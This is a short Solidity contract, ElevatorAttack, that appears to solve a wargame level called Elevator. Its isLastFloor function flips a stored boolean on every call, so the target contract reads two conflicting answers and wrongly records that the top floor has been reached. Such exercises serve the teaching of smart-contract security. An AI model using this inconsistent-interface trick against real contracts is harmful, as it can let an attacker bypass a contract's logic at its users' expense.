// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorAttack {
    bool public toggle = true;
    Elevator public target;

    constructor(address _victimContractAddress) {
        target = Elevator(_victimContractAddress);
    }

    function isLastFloor(uint) public returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function callTop(uint _floor) public {
        target.goTo(_floor);
    }
}